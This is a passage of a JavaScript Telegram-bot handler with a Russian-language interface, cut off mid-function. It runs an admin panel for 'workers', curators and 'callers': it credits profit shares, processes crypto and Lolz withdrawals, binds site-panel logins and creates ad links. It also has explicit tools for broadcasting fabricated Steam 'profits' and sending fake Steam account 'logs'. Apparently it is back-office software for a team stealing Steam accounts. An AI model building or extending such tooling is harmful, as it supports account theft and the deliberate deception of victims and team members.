const {
  isAdminTelegramId,
  setProfitPercent,
  setUserBio,
  ensureUser,
  findUserByQuery,
  getUserByTelegramId,
  addWalletBalanceUsd,
  setFakeProfitTag,
} = require("../services/userService");
const { addProfitToUserByTelegramId, deductUserProfitStats } = require("../services/profitService");
const { setGlobalWorkerPercent, setUsdRubRate, getGlobalWorkerPercent } = require("../services/settingsService");
const { enableTemplateById, renameTemplateById } = require("../services/adminSitesService");
const { buildAdminTemplatesView, escapeAdminHtml } = require("../utils/adminTemplatesUi");
const { addFormQuestion, getForm } = require("../services/formService");
const { adminQuestionsKeyboard } = require("../keyboards/application");
const { env } = require("../config/env");
const {
  getAvailableUsd,
  findAwaitingLinkForAdmin,
  completePayoutWithLink,
  normalizePayoutUrl,
  notifyApprovedPayout,
  buildWithdrawConfirmHtml,
  validateWalletAddress,
  methodLabel,
  calcPayoutBreakdown,
  isLinkPayoutMethod,
  isNicknamePayoutMethod,
  payoutLinkLabel,
  getMinWithdrawalUsd,
} = require("../services/withdrawalService");
const { upsertBotMessage } = require("../utils/message");
const { pe } = require("../utils/emoji");
const { clearPendingInputs, isBotCommandText } = require("../utils/session");
const { formatMemberCardHtml, renderMemberCardHtml } = require("../utils/adminMemberCard");
const { getCurrencyContext, formatDisplayAmount } = require("../services/currencyService");
const {
  normalizeFakeProfitTag,
  formatFakeProfitTagLabel,
} = require("../utils/fakeProfitTag");
const {
  walletAmountCancelKeyboard,
  withdrawConfirmKeyboard,
  settingsResultKeyboard,
  fakeTagKeyboard,
} = require("../keyboards/common");
const {
  adminBackKeyboard,
  adminCancelKeyboard,
  adminResultKeyboard,
  memberActionKeyboard,
  adminAdCampaignKeyboard,
} = require("../keyboards/admin");
const {
  createCampaign,
  buildTelegramDeepLink,
  buildTrackingRedirectUrl,
  validateSlugInput,
  normalizeSlug,
} = require("../services/adCampaignService");
const {
  bindWorkerPanelAccount,
  parsePanelCredentialsInput,
} = require("../services/panelAccountService");
const { formatPanelError } = require("../services/apiService");
const { sendFakeSteamProfit, sendFakeSteamLog } = require("../services/steamMonitorService");
const {
  fetchSteamAccountById,
  sendAdminLogCard,
} = require("../services/steamLogAdminService");
const { resolveFakeSteamProfitInput } = require("../services/steamMarketLookup");
const { FAKE_STEAM_PROFIT_SKINS_INSTRUCTION_HTML } = require("../utils/fakeSteamProfitInput");
const {
  FAKE_STEAM_LOG_INSTRUCTION_HTML,
  parseFakeSteamLogInput,
} = require("../utils/fakeSteamLogInput");
const { updateCuratorSettings } = require("../services/curatorService");
const { updateCallerSettings } = require("../services/callerService");
const { announceWorkerPercentChange } = require("../services/workerPercentAnnounceService");
const { handleFeedbackTextInput, handleFeedbackAdminTextInput } = require("../commands/feedback");
const { handleBranchTextInput } = require("./branchHandler");

function formatMoney(value) {
  return `$${Number(value || 0).toFixed(2)}`;
}

function registerTextHandlers(bot) {
  bot.on("text", async (ctx, next) => {
    if (ctx.scene && ctx.scene.current) {
      return next();
    }

    const incoming = String(ctx.message?.text || "").trim();
    if (isBotCommandText(incoming)) {
      clearPendingInputs(ctx);
      return next();
    }

    if (await handleFeedbackAdminTextInput(ctx, incoming)) {
      return;
    }

    if (await handleFeedbackTextInput(ctx, incoming)) {
      return;
    }

    if (await handleBranchTextInput(ctx, incoming)) {
      return;
    }

    if (ctx.session?.fakeTagEdit) {
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch (_) {
        /* ignore */
      }
      const normalized = normalizeFakeProfitTag(incoming);
      if (!normalized) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Тег должен содержать латинские буквы и цифры (до 6 символов).`,
          { reply_markup: fakeTagKeyboard().reply_markup }
        );
        return;
      }
      const updated = await setFakeProfitTag(ctx.from.id, normalized);
      ctx.session.fakeTagEdit = null;
      await upsertBotMessage(
        ctx,
        [
          `${pe("success")} FAKE-TAG обновлён: <b>${formatFakeProfitTagLabel(updated?.fakeProfitTag || normalized)}</b>`,
          "",
          `${pe("information")} В канале: <b>Профит у ${formatFakeProfitTagLabel(updated?.fakeProfitTag || normalized)}</b> <code>[ID: Аноним]</code>`,
        ].join("\n"),
        { reply_markup: fakeTagKeyboard(updated?.fakeProfitTag || normalized).reply_markup }
      );
      return;
    }

    if (ctx.session?.profileEditBio) {
      const text = incoming;
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch (_) {
        /* ignore */
      }
      const updated = await setUserBio(ctx.from.id, text);
      ctx.session.profileEditBio = null;
      await upsertBotMessage(
        ctx,
        `${pe("success")} Поле «О себе» обновлено.\nТекущее значение: ${updated?.bio || "Отсутствует"}`,
        { reply_markup: settingsResultKeyboard().reply_markup }
      );
      return;
    }

    if (ctx.session?.walletWithdraw?.step === "address") {
      const st = ctx.session.walletWithdraw;
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch (_) {
        /* ignore */
      }
      const check = validateWalletAddress(st.method, incoming);
      if (!check.ok) {
        const nick = isNicknamePayoutMethod(st.method);
        await upsertBotMessage(
          ctx,
          [
            `${pe("error")} ${check.error}`,
            "",
            `${nick ? "Сервис" : "Сеть"}: <b>${methodLabel(st.method)}</b>`,
            nick ? "Введите ник на Lolz ещё раз." : "Введите адрес кошелька ещё раз.",
          ].join("\n"),
          { reply_markup: walletAmountCancelKeyboard().reply_markup }
        );
        return;
      }

      const user = await ensureUser(ctx.from);
      const available = await getAvailableUsd(user);
      const minW = getMinWithdrawalUsd();
      ctx.session.walletWithdraw = {
        step: "amount",
        method: st.method,
        address: check.address,
      };
      const amountLines = [
        `${pe("transfer")} <b>Сумма вывода</b>`,
        "",
        `${isNicknamePayoutMethod(st.method) ? "Сервис" : "Сеть"}: <b>${methodLabel(st.method)}</b>`,
      ];
      if (isNicknamePayoutMethod(st.method) && check.address) {
        amountLines.push(`Ник: <code>${check.address}</code>`);
      } else if (!isLinkPayoutMethod(st.method) && check.address) {
        amountLines.push(`Кошелёк: <code>${check.address}</code>`);
      }
      amountLines.push(
        "",
        `Доступно: <b>${formatMoney(available)}</b>`,
        `Минимум: <b>${formatMoney(minW)}</b>`,
        "",
        "Введите сумму в <b>долларах США ($)</b>."
      );
      await upsertBotMessage(
        ctx,
        amountLines.join("\n"),
        { reply_markup: walletAmountCancelKeyboard().reply_markup }
      );
      return;
    }

    if (ctx.session?.walletWithdraw?.step === "amount") {
      const st = ctx.session.walletWithdraw;
      const user = await ensureUser(ctx.from);
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch (_) {
        /* ignore */
      }
      const raw = (ctx.message.text || "").trim().replace(/\s/g, "").replace(",", ".");
      const amount = Math.round(Number(raw) * 100) / 100;
      const minW = getMinWithdrawalUsd();
      if (!Number.isFinite(amount) || amount < minW) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите сумму не меньше ${formatMoney(minW)} (число в $).`,
          { reply_markup: walletAmountCancelKeyboard().reply_markup }
        );
        return;
      }
      const available = await getAvailableUsd(user);
      if (amount - 1e-9 > available) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Недостаточно средств. Доступно: ${formatMoney(available)}`,
          { reply_markup: walletAmountCancelKeyboard().reply_markup }
        );
        return;
      }
      const { networkFee, payoutAmount } = calcPayoutBreakdown(amount, st.method);
      if (payoutAmount <= 0) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Сумма должна быть больше комиссии сети (${formatMoney(networkFee)}).`,
          { reply_markup: walletAmountCancelKeyboard().reply_markup }
        );
        return;
      }

      ctx.session.walletWithdraw = {
        step: "confirm",
        method: st.method,
        address: st.address,
        amount,
      };
      await upsertBotMessage(
        ctx,
        buildWithdrawConfirmHtml({
          method: st.method,
          address: st.address,
          amountUsd: amount,
        }),
        { reply_markup: withdrawConfirmKeyboard().reply_markup }
      );
      return;
    }

    const compose = ctx.session?.adminCompose;
    const text = ctx.message.text?.trim();
    const adminInput = ctx.session?.adminInput;
    const isAdmin = isAdminTelegramId(ctx.from.id);

    if (!compose && !adminInput && isAdmin) {
      const pendingPayout = await findAwaitingLinkForAdmin(ctx.from.id);
      if (pendingPayout) {
        const rawText = (ctx.message.text || "").trim();
        try {
          await ctx.deleteMessage(ctx.message.message_id);
        } catch (_) {
          /* ignore */
        }
        const norm = normalizePayoutUrl(rawText);
        if (!norm) {
          await upsertBotMessage(
            ctx,
            `${pe("error")} Нужна корректная ссылка на ${payoutLinkLabel(pendingPayout.method)}, начинающаяся с https://`,
            { reply_markup: adminCancelKeyboard().reply_markup }
          );
          return;
        }
        try {
          const { request } = await completePayoutWithLink(
            pendingPayout._id,
            norm,
            ctx.from.id
          );
          await notifyApprovedPayout(ctx.telegram, request);
          await upsertBotMessage(
            ctx,
            `${pe("success")} Пользователь получил ссылку, уведомление закреплено.`,
            { reply_markup: adminResultKeyboard().reply_markup }
          );
        } catch (e) {
          await upsertBotMessage(ctx, `${pe("error")} ${e.message}`, {
            reply_markup: adminBackKeyboard().reply_markup,
          });
        }
        return;
      }
    }

    if (!compose && !adminInput) return next();
    if (!isAdmin) {
      ctx.session.adminCompose = null;
      ctx.session.adminInput = null;
      return next();
    }

    try {
      await ctx.deleteMessage(ctx.message.message_id);
    } catch (_) {
      // Ignore: message can be non-deletable due to Telegram permissions.
    }

    if (!text) {
      const cancelBack =
        adminInput?.type === "search_user" ||
        adminInput?.type === "profit" ||
        adminInput?.type === "profit_deduct" ||
        adminInput?.type === "wallet_topup" ||
        adminInput?.type === "percent" ||
        adminInput?.type === "panel_bind" ||
        compose
          ? "admin:users"
          : adminInput?.type === "global_percent" ||
              adminInput?.type === "currency_rate" ||
              adminInput?.type === "fake_profit_owner" ||
              adminInput?.type === "fake_profit_skins" ||
              adminInput?.type === "fake_log_owner" ||
              adminInput?.type === "fake_log_fields"
            ? "admin:economy"
            : adminInput?.type === "template_enable" ||
                adminInput?.type === "template_name" ||
                adminInput?.type === "template_rename"
              ? "admin:templates"
            : adminInput?.type === "search_log"
              ? "admin:logs"
            : adminInput?.type === "curator_desc" ||
                adminInput?.type === "curator_percent" ||
                adminInput?.type === "curator_min_profits" ||
                adminInput?.type === "caller_desc" ||
                adminInput?.type === "caller_percent" ||
                adminInput?.type === "caller_min_profits" ||
                adminInput?.type === "profit_deduct"
              ? `admin:member:${adminInput.telegramId}`
            : adminInput?.type === "app_question_label" ||
                adminInput?.type === "app_question_prompt"
              ? "admin:apps:questions"
            : adminInput?.type === "ad_campaign_name" ||
                adminInput?.type === "ad_campaign_slug" ||
                adminInput?.type === "ad_campaign_source"
              ? "admin:ads:period:all"
              : "admin:panel";
      await upsertBotMessage(ctx, `${pe("error")} Пустое сообщение. Повторите ввод.`, {
        reply_markup: adminCancelKeyboard(cancelBack).reply_markup,
      });
      return;
    }

    if (adminInput?.type === "panel_bind") {
      const parsed = parsePanelCredentialsInput(text);
      if (!parsed) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Формат: <code>логин:пароль</code>`,
          { reply_markup: adminCancelKeyboard(`admin:panelacc:${adminInput.telegramId}`).reply_markup }
        );
        return;
      }
      const member = await getUserByTelegramId(adminInput.telegramId);
      if (!member) {
        ctx.session.adminInput = null;
        await upsertBotMessage(ctx, `${pe("error")} Пользователь не найден.`, {
          reply_markup: adminBackKeyboard("admin:users").reply_markup,
        });
        return;
      }
      try {
        await bindWorkerPanelAccount(member, parsed.username, parsed.password);
        ctx.session.adminInput = null;
        const currencyCtx = await getCurrencyContext();
        await upsertBotMessage(
          ctx,
          `${pe("success")} Аккаунт сайтов привязан.\n\n${formatMemberCardHtml(member, currencyCtx)}`,
          { reply_markup: memberActionKeyboard(member.telegramId, member.isBanned, member.isCurator, member.isCaller, member.isModerator, member).reply_markup }
        );
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
          reply_markup: adminCancelKeyboard(`admin:panelacc:${adminInput.telegramId}`).reply_markup,
        });
      }
      return;
    }

    if (adminInput?.type === "profit") {
      const amount = Number(text.replace(",", "."));
      if (!Number.isFinite(amount) || amount <= 0) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите корректную сумму профита (число больше 0).`,
          { reply_markup: adminCancelKeyboard("admin:users").reply_markup }
        );
        return;
      }

      const result = await addProfitToUserByTelegramId(
        adminInput.telegramId,
        amount,
        ctx.from.id
      );
      if (!result) {
        ctx.session.adminInput = null;
        await upsertBotMessage(ctx, `${pe("error")} Пользователь не найден.`, {
          reply_markup: adminBackKeyboard("admin:users").reply_markup,
        });
        return;
      }

      await ctx.telegram.sendMessage(
        result.user.telegramId,
        [
          `${pe("celebrate")} <b>Поздравляю вас с профитом!</b>`,
          "",
          `Общий профит: ${formatMoney(amount)}`,
          ` ┖ Твоя доля: ${formatMoney(result.workerShare)} (${result.user.profitPercent}%)`,
          result.branchCommission
            ? ` ┖ Филиал: −${formatMoney(result.branchCommission)}`
            : null,
        ].filter(Boolean).join("\n"),
        { parse_mode: "HTML" }
      );

      await upsertBotMessage(
        ctx,
        `${pe("success")} Начислено ${formatMoney(amount)} пользователю <code>${result.user.telegramId}</code>.\nДоля воркера: ${formatMoney(result.workerShare)}.`,
        { reply_markup: adminResultKeyboard("admin:users").reply_markup }
      );
      ctx.session.adminInput = null;
      return;
    }

    if (adminInput?.type === "wallet_topup") {
      const amount = Math.round(Number(String(text).replace(",", ".").replace(/\s/g, "")) * 100) / 100;
      if (!Number.isFinite(amount) || amount <= 0) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите сумму в долларах (число больше 0).`,
          { reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup }
        );
        return;
      }

      try {
        const { user, amountUsd } = await addWalletBalanceUsd(
          adminInput.telegramId,
          amount,
          ctx.from.id
        );
        try {
          await ctx.telegram.sendMessage(
            user.telegramId,
            [
              `${pe("wallet")} <b>Кошелёк пополнен</b>`,
              "",
              `Сумма: <b>${formatMoney(amountUsd)}</b>`,
              `Баланс: <b>${formatMoney(user.totalProfit)}</b>`,
            ].join("\n"),
            { parse_mode: "HTML" }
          );
        } catch (_) {
          /* ignore */
        }

        await upsertBotMessage(
          ctx,
          [
            `${pe("success")} Кошелёк пополнен на <b>${formatMoney(amountUsd)}</b>.`,
            `Пользователь: <code>${user.telegramId}</code>`,
            `Баланс: <b>${formatMoney(user.totalProfit)}</b>`,
          ].join("\n"),
          {
            reply_markup: memberActionKeyboard(
              user.telegramId, user.isBanned, user.isCurator, user.isCaller, user.isModerator).reply_markup,
          }
        );
      } catch (e) {
        await upsertBotMessage(ctx, `${pe("error")} ${e.message}`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      ctx.session.adminInput = null;
      return;
    }

    if (adminInput?.type === "profit_deduct") {
      const parts = String(text || "")
        .trim()
        .replace(/,/g, ".")
        .split(/\s+/);
      if (parts.length < 2) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите сумму и количество через пробел.\nПример: <code>108 1</code>`,
          { reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup }
        );
        return;
      }

      const amountUsd = Number(parts[0]);
      const count = Number(parts[1]);
      if (!Number.isFinite(amountUsd) || amountUsd <= 0 || !Number.isFinite(count) || count < 1) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Некорректный формат. Пример: <code>108.50 2</code>`,
          { reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup }
        );
        return;
      }

      try {
        const result = await deductUserProfitStats(adminInput.telegramId, {
          amountUsd,
          count: Math.floor(count),
        });
        if (!result) {
          ctx.session.adminInput = null;
          await upsertBotMessage(ctx, `${pe("error")} Пользователь не найден.`, {
            reply_markup: adminBackKeyboard("admin:users").reply_markup,
          });
          return;
        }

        const currencyCtx = await getCurrencyContext();
        const mismatch =
          Math.abs(result.removedShare - result.requestedAmount) > 0.01
            ? `\n${pe("info")} Запрошено ${formatDisplayAmount(result.requestedAmount, currencyCtx)}, фактически списано ${formatDisplayAmount(result.removedShare, currencyCtx)} (по удалённым записям).`
            : "";

        await upsertBotMessage(
          ctx,
          [
            `${pe("success")} <b>Профиты списаны</b>`,
            "",
            `Удалено записей: <b>${result.removedCount}</b>`,
            `Списано с кошелька: <b>${formatDisplayAmount(result.removedShare, currencyCtx)}</b>`,
            `Новый баланс: <b>${formatDisplayAmount(result.newBalance, currencyCtx)}</b>${mismatch}`,
            "",
            await renderMemberCardHtml(result.user, currencyCtx),
          ].join("\n"),
          {
            reply_markup: memberActionKeyboard(
              result.user.telegramId,
              result.user.isBanned,
              result.user.isCurator,
              result.user.isCaller,
              result.user.isModerator
            ).reply_markup,
          }
        );
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }

      ctx.session.adminInput = null;
      return;
    }

    if (adminInput?.type === "percent") {
      const percent = Number(text.replace("%", "").replace(",", "."));
      if (!Number.isFinite(percent) || percent < 1 || percent > 100) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Процент должен быть числом от 1 до 100.`,
          { reply_markup: adminCancelKeyboard("admin:users").reply_markup }
        );
        return;
      }

      const updatedUser = await setProfitPercent(adminInput.telegramId, percent);
      if (!updatedUser) {
        ctx.session.adminInput = null;
        await upsertBotMessage(ctx, `${pe("error")} Пользователь не найден.`, {
          reply_markup: adminBackKeyboard("admin:users").reply_markup,
        });
        return;
      }

      await upsertBotMessage(
        ctx,
        `${pe("success")} Процент воркера для <code>${updatedUser.telegramId}</code> обновлён: ${updatedUser.profitPercent}%.`,
        { reply_markup: adminResultKeyboard("admin:users").reply_markup }
      );
      ctx.session.adminInput = null;
      return;
    }

    if (adminInput?.type === "curator_desc") {
      if (text.length > 500) {
        await upsertBotMessage(ctx, `${pe("error")} Описание слишком длинное (макс. 500).`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      try {
        await updateCuratorSettings(adminInput.telegramId, { description: text });
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      ctx.session.adminInput = { type: "curator_percent", telegramId: adminInput.telegramId };
      await upsertBotMessage(
        ctx,
        `${pe("success")} Описание сохранено.\n\n${pe("analytics")} Введите <b>процент</b> куратора (1–100).`,
        { reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup }
      );
      return;
    }

    if (adminInput?.type === "curator_percent") {
      const percent = Number(text.replace("%", "").replace(",", "."));
      try {
        await updateCuratorSettings(adminInput.telegramId, { percent });
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      ctx.session.adminInput = { type: "curator_min_profits", telegramId: adminInput.telegramId };
      await upsertBotMessage(
        ctx,
        `${pe("success")} Процент сохранён: <b>${percent}%</b>\n\n${pe("statistics")} Введите <b>обязательное количество профитов</b> для заявки (целое число ≥ 0).`,
        { reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup }
      );
      return;
    }

    if (adminInput?.type === "curator_min_profits") {
      const minProfits = Number(text.replace(",", "."));
      try {
        if (!Number.isInteger(minProfits)) throw new Error("Введите целое число.");
        await updateCuratorSettings(adminInput.telegramId, { minProfits });
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      const member = await getUserByTelegramId(adminInput.telegramId);
      ctx.session.adminInput = null;
      const currencyCtx = await getCurrencyContext();
      await upsertBotMessage(
        ctx,
        `${pe("success")} Настройки куратора сохранены.\n\n${formatMemberCardHtml(member, currencyCtx)}`,
        {
          reply_markup: memberActionKeyboard(
            member.telegramId, member.isBanned, member.isCurator, member.isCaller, member.isModerator).reply_markup,
        }
      );
      return;
    }

    if (adminInput?.type === "caller_desc") {
      if (text.length > 500) {
        await upsertBotMessage(ctx, `${pe("error")} Описание слишком длинное (макс. 500).`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      try {
        await updateCallerSettings(adminInput.telegramId, { description: text });
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      ctx.session.adminInput = { type: "caller_percent", telegramId: adminInput.telegramId };
      await upsertBotMessage(
        ctx,
        `${pe("success")} Описание сохранено.\n\n${pe("analytics")} Введите <b>процент</b> прозвонщицы (1–100).`,
        { reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup }
      );
      return;
    }

    if (adminInput?.type === "caller_percent") {
      const percent = Number(text.replace("%", "").replace(",", "."));
      try {
        await updateCallerSettings(adminInput.telegramId, { percent });
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      ctx.session.adminInput = { type: "caller_min_profits", telegramId: adminInput.telegramId };
      await upsertBotMessage(
        ctx,
        `${pe("success")} Процент сохранён: <b>${percent}%</b>\n\n${pe("statistics")} Введите <b>обязательное количество профитов</b> для заявки (целое число ≥ 0).`,
        { reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup }
      );
      return;
    }

    if (adminInput?.type === "caller_min_profits") {
      const minProfits = Number(text.replace(",", "."));
      try {
        if (!Number.isInteger(minProfits)) throw new Error("Введите целое число.");
        await updateCallerSettings(adminInput.telegramId, { minProfits });
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard(`admin:member:${adminInput.telegramId}`).reply_markup,
        });
        return;
      }
      const member = await getUserByTelegramId(adminInput.telegramId);
      ctx.session.adminInput = null;
      const currencyCtx = await getCurrencyContext();
      await upsertBotMessage(
        ctx,
        `${pe("success")} Настройки прозвонщицы сохранены.\n\n${formatMemberCardHtml(member, currencyCtx)}`,
        {
          reply_markup: memberActionKeyboard(
            member.telegramId, member.isBanned, member.isCurator, member.isCaller, member.isModerator).reply_markup,
        }
      );
      return;
    }

    if (adminInput?.type === "fake_profit_owner") {
      const member = await findUserByQuery(text);
      if (!member) {
        await upsertBotMessage(ctx, `${pe("error")} Участник не найден. Укажите ID или @username.`, {
          reply_markup: adminCancelKeyboard("admin:economy").reply_markup,
        });
        return;
      }
      ctx.session.adminInput = {
        type: "fake_profit_skins",
        attribution: "user",
        ownerTelegramId: member.telegramId,
      };
      await upsertBotMessage(ctx, `${pe("success")} Участник: <code>${member.telegramId}</code>\n\n${FAKE_STEAM_PROFIT_SKINS_INSTRUCTION_HTML}`, {
        reply_markup: adminCancelKeyboard("admin:economy").reply_markup,
      });
      return;
    }

    if (adminInput?.type === "fake_profit_skins") {
      await upsertBotMessage(ctx, `${pe("loading")} Подбираю скины из базы…`);
      try {
        const parsed = await resolveFakeSteamProfitInput(text);
        if (parsed.error) {
          await upsertBotMessage(ctx, `${pe("error")} ${parsed.error}`, {
            reply_markup: adminCancelKeyboard("admin:economy").reply_markup,
          });
          return;
        }
        const sent = await sendFakeSteamProfit(bot, {
          items: parsed.items,
          total: parsed.total,
          balanceUsd: parsed.balanceUsd,
          inventoryUsd: parsed.inventoryUsd,
          games: parsed.games,
          mafileTime: parsed.mafileTime,
          ownerTelegramId: adminInput.attribution === "user" ? adminInput.ownerTelegramId : "",
          fakeTag: adminInput.attribution === "anon" ? parsed.fakeTag : "",
        });
        ctx.session.adminInput = null;
        await upsertBotMessage(
          ctx,
          `${pe("success")} Фейк-профит отправлен. Сумма: <b>$${parsed.total.toFixed(2)}</b> (баланс $${parsed.balanceUsd.toFixed(2)} + инвентарь $${parsed.inventoryUsd.toFixed(2)}).\n${adminInput.attribution === "anon" ? `Тег: <b>#${sent.fakeTag}</b>\n` : ""}ID: <code>${sent.sourceId}</code> — статус меняется в разделе MaFile.`,
          {
            reply_markup: adminResultKeyboard("admin:economy").reply_markup,
          }
        );
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard("admin:economy").reply_markup,
        });
      }
      return;
    }

    if (adminInput?.type === "fake_log_owner") {
      const member = await findUserByQuery(text);
      if (!member) {
        await upsertBotMessage(ctx, `${pe("error")} Участник не найден. Укажите ID или @username.`, {
          reply_markup: adminCancelKeyboard("admin:economy").reply_markup,
        });
        return;
      }
      ctx.session.adminInput = {
        type: "fake_log_fields",
        ownerTelegramId: member.telegramId,
      };
      await upsertBotMessage(
        ctx,
        `${pe("success")} Участник: <code>${member.telegramId}</code>\n\n${FAKE_STEAM_LOG_INSTRUCTION_HTML}`,
        { reply_markup: adminCancelKeyboard("admin:economy").reply_markup }
      );
      return;
    }

    if (adminInput?.type === "fake_log_fields") {
      const parsed = parseFakeSteamLogInput(text);
      if (parsed.error) {
        await upsertBotMessage(ctx, `${pe("error")} ${parsed.error}`, {
          reply_markup: adminCancelKeyboard("admin:economy").reply_markup,
        });
        return;
      }
      try {
        const ownerTelegramId = adminInput.ownerTelegramId;
        await sendFakeSteamLog(bot, {
          account: parsed.account,
          ownerTelegramId,
        });
        ctx.session.adminInput = null;
        await upsertBotMessage(
          ctx,
          `${pe("success")} Фейк-лог отправлен в ЛС <code>${ownerTelegramId}</code>.`,
          { reply_markup: adminResultKeyboard("admin:economy").reply_markup }
        );
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard("admin:economy").reply_markup,
        });
      }
      return;
    }

    if (adminInput?.type === "ad_campaign_name") {
      const name = text.trim();
      if (!name) {
        await upsertBotMessage(ctx, `${pe("error")} Укажите название рекламы.`, {
          reply_markup: adminCancelKeyboard("admin:ads:period:all").reply_markup,
        });
        return;
      }
      ctx.session.adminInput = { type: "ad_campaign_slug", name };
      await upsertBotMessage(
        ctx,
        [
          `${pe("tag")} Название: <b>${name}</b>`,
          "",
          "Введите название ссылки — то, что будет после <code>start=</code>.",
          "Пример: <code>tg_march</code> → <code>?start=c_tg_march</code>",
        ].join("\n"),
        { reply_markup: adminCancelKeyboard("admin:ads:period:all").reply_markup }
      );
      return;
    }

    if (adminInput?.type === "ad_campaign_slug") {
      const slugInput = text.trim();
      if (!slugInput) {
        await upsertBotMessage(ctx, `${pe("error")} Укажите название ссылки.`, {
          reply_markup: adminCancelKeyboard("admin:ads:period:all").reply_markup,
        });
        return;
      }
      try {
        validateSlugInput(slugInput);
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard("admin:ads:period:all").reply_markup,
        });
        return;
      }
      ctx.session.adminInput = { type: "ad_campaign_source", name: adminInput.name, slug: slugInput };
      await upsertBotMessage(
        ctx,
        [
          `${pe("tag")} Название: <b>${adminInput.name}</b>`,
          `Ссылка: <code>c_${normalizeSlug(slugInput)}</code>`,
          "",
          "Укажите площадку (например: Тг бот/Форум).",
          "Или отправьте <code>-</code>, чтобы пропустить.",
        ].join("\n"),
        { reply_markup: adminCancelKeyboard("admin:ads:period:all").reply_markup }
      );
      return;
    }

    if (adminInput?.type === "ad_campaign_source") {
      const source = text.trim() === "-" ? "" : text.trim();
      try {
        const campaign = await createCampaign({
          name: adminInput.name,
          slug: adminInput.slug,
          source,
          createdByTelegramId: String(ctx.from.id),
        });
        ctx.session.adminInput = null;
        const telegramUrl = buildTelegramDeepLink(campaign.slug);
        const trackingUrl = buildTrackingRedirectUrl(campaign.slug);
        await upsertBotMessage(
          ctx,
          [
            `${pe("success")} <b>Реклама создана</b>`,
            "",
            `<b>${campaign.name}</b>${campaign.source ? `\nПлощадка: <b>${campaign.source}</b>` : ""}`,
            "",
            `${pe("link")} Ссылка:\n<code>${telegramUrl}</code>`,
            trackingUrl ? `\nКлики:\n<code>${trackingUrl}</code>` : "",
          ].join("\n"),
          {
            reply_markup: adminAdCampaignKeyboard(String(campaign._id), "all", campaign.status)
              .reply_markup,
          }
        );
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard("admin:ads:period:all").reply_markup,
        });
      }
      return;
    }

    if (adminInput?.type === "app_question_label") {
      if (text.length > 64) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Название слишком длинное (макс. 64).`,
          { reply_markup: adminCancelKeyboard("admin:apps:questions").reply_markup }
        );
        return;
      }
      ctx.session.adminInput = { type: "app_question_prompt", label: text };
      await upsertBotMessage(
        ctx,
        [
          `${pe("edit")} Название: <b>${text}</b>`,
          "",
          "Теперь отправьте <b>текст вопроса</b>, который увидит кандидат.",
        ].join("\n"),
        { reply_markup: adminCancelKeyboard("admin:apps:questions").reply_markup }
      );
      return;
    }

    if (adminInput?.type === "app_question_prompt") {
      if (text.length > 500) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Текст вопроса слишком длинный (макс. 500).`,
          { reply_markup: adminCancelKeyboard("admin:apps:questions").reply_markup }
        );
        return;
      }
      try {
        const question = await addFormQuestion("teamApplication", {
          label: adminInput.label,
          prompt: text,
        });
        ctx.session.adminInput = null;
        const form = await getForm("teamApplication");
        await upsertBotMessage(
          ctx,
          [
            `${pe("success")} Вопрос добавлен: <b>${question.label}</b>`,
            "",
            `Всего вопросов: <b>${form.questions.length}</b>`,
          ].join("\n"),
          { reply_markup: adminQuestionsKeyboard(form.questions).reply_markup }
        );
